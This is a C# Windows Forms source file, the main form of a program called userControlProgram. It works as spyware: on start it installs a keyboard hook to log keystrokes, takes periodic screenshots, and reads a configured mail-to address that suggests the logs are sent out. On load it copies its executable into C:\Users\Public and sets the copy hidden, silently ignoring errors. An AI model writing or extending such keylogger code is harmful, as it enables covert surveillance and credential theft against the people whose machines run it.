using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace userControlProgram
{
    public partial class Form1 : Form
    {
        private const string NeedPath = "C:\\Users\\Public\\userControlProgram.exe";
        private string  _mailTo;
        public string LogPath;
        private int _screenShotTimer;
        public Form1()
        {
            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _screenShotTimer);
            KeyLogger.SetHook(LogPath);
            ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(NeedPath))
            {
                try
                {
                    File.Copy("system.exe", "C:\\Users\\Public\\userControlProgram.exe");
                    File.SetAttributes("C:\\Users\\Public\\userControlProgram.exe", FileAttributes.Hidden);
                }
                catch
                {
                    
                }
            }
        }
    }
}
